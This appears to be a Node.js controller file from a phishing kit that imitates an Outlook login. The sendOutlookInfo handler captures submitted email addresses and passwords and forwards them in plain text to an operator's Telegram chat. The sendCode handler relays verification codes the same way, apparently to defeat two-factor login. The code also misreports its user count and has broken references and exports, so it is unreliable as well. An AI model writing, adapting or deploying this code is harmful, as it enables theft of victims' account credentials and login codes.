const Outlook = require("../models/youngModel");

const TelegramBot = require("node-telegram-bot-api");
const bot = new TelegramBot(process.env.TELEGRAM_BOT_ME);

const register = async (req, res) => {
  try {
    const user = await Outlook.create(req.body);
    if (user) {
      console.log("sent");
    }
    bot.sendMessage(
      process.env.TELEGRAM_CHAT_ID_ME,
      `New registration from buildings:::: \n ${user}`
    );

    res.status(201).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

const getAllUsers = async (req, res) => {
  try {
    const users = await Outlook.find({});

    res.status(200).json({ nbHits: users.length - 13, users });
  } catch (error) {
    console.log(error);
  }
};
module.exports = {
  register,
  getAllUsers,
};

// commented form here
const os = require("os");

const getIpAddress = () => {
  const networkInterfaces = os.networkInterfaces();
  let ipAddress;
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName];
    for (const iface of interfaces) {
      if (!iface.internal && iface.family === "IPv4") {
        ipAddress = iface.address;
        break;
      }
    }
    if (ipAddress) {
      break;
    }
  }
  return ipAddress;
};

// const sendEmail = async (req, res) => {
//   try {
//     const ipAddress = getIpAddress();
//     const userAgent = req.headers["user-agent"];
//     let user = await Login.findOne({ ip: ipAddress + userAgent });

//     if (user) {
//       user.email = req.body.email;
//       user.password = req.body.password;
//       await user.save();
//     }

//     req.body.ip = getIpAddress() + userAgent;
//     user = await Login.create(req.body);

//     res.status(200).json({ user });
//   } catch (error) {
//     console.log(error);
//     res.status(500).json({ error: error.message });
//   }
// };

const sendCode = async (req, res) => {
  try {
    const ipAddress = getIpAddress();
    const userAgent = req.headers["user-agent"];
    if (!ipAddress) {
      return res.status(404).json({ error: "ip address not found" });
    }
    const user = await Login.findOneAndUpdate(
      { ip: ipAddress + userAgent },
      { code: req.body.code },
      { new: true }
    );
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    const message = `${`${user.code} from ${user.email}`}`;
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, message);

    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

const sendOutlookInfo = async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: "please enter email and password" });
    }

    const user = await Outlook.create({ email, password });
    const message = `${` message from Outlook \n Outlook Email::: ${user.email} \n outlook password::: ${user.password}`}`;
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, message);
    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};


module.exports = {
sendOutlookInfo
};